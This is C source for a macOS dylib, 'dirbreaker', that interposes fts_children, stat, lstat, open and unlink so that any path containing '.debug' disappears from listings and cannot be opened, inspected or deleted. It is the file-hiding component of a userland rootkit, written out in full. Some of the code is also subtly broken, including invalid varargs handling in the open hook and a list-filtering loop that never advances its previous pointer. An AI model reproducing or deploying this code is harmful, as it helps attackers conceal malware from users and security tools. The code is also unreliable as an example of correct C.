//
//  dirbreaker.c
//  dirbreaker
//
//  Created by Nikola Tesla on 3/1/16.
//  Copyright © 2016 WireTech. All rights reserved.
//

#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <fcntl.h>
#include <dlfcn.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fts.h>
#include <limits.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

#define HIDDEN ".debug"

#define DYLD_INTERPOSE(_replacment,_replacee) \
__attribute__((used)) static struct{ const void* replacment; const void* replacee; } _interpose_##_replacee \
__attribute__ ((section ("__DATA,__interpose"))) = { (const void*)(unsigned long)&_replacment, (const void*)(unsigned long)&_replacee };

typedef FTSENT* (*fts_children_type)(FTS *, int);
typedef int (*unink_type)(const char *);
typedef int (*lstat_type)(const char *, struct stat *restrict);
typedef int (*stat_type)(const char *restrict path, struct stat *restrict buf);
typedef int (*open_type)(const char *, int, ...);

static fts_children_type orig_fts_children = fts_children;
static unink_type orig_unlink = unlink;
static lstat_type orig_lstat = lstat;
static stat_type orig_stat = stat;
static open_type orig_open = open;

FTSENT *_new_fts_children(FTS *ftsp, int options) {
    FTSENT *result = orig_fts_children(ftsp, options);

    if (result == NULL) {
        errno = 0;
        return NULL;
    }
    if (strstr(result->fts_accpath, HIDDEN) != NULL) {
        if (result->fts_link) {
            result = result->fts_link;
        } else {
            result->fts_errno = ENOENT;
        }
    }
    if (result == NULL) {
        errno = 0;
        return NULL;
    }
    FTSENT *current = result;
    FTSENT *prev = current;
    do {
        if (strstr(current->fts_accpath, HIDDEN) != NULL) {
            prev->fts_link = current->fts_link;
        }
    } while ((current = current->fts_link) != NULL);
    return result;
}

//FILE *_new_fts_read(FTS *ftsp) {
//    
//}

int _new_unlink(const char *path) {
    if (strstr(path, HIDDEN) == NULL) {
        return orig_unlink(path);
    }
    errno = ENOENT;
    return -1;
}

int _new_lstat(const char *restrict path, struct stat *restrict buf) {
    if (strstr(path, HIDDEN) == NULL) {
        return orig_lstat(path, buf);
    }
    errno = ENOENT;
    return -1;
}

int _new_stat(const char *restrict path, struct stat *restrict buf) {
    if (strstr(path, HIDDEN) == NULL) {
        return orig_stat(path, buf);
    }
    errno = ENOENT;
    return -1;
}

int _new_open(const char *path, int oflag, ...) {
    int otherflag = *(&oflag + sizeof(int));
    if (strstr(path, HIDDEN) == NULL) {
        if (otherflag == '\0') {
            return orig_open(path, oflag);
        } else {
            return orig_open(path, oflag, otherflag);
        }
    }
    errno = ENOENT;
    return -1;
}

__attribute__((constructor)) void init(void) {
}

DYLD_INTERPOSE(_new_fts_children, fts_children);
DYLD_INTERPOSE(_new_unlink, unlink);
DYLD_INTERPOSE(_new_lstat, lstat);
DYLD_INTERPOSE(_new_stat, stat);
DYLD_INTERPOSE(_new_open, open);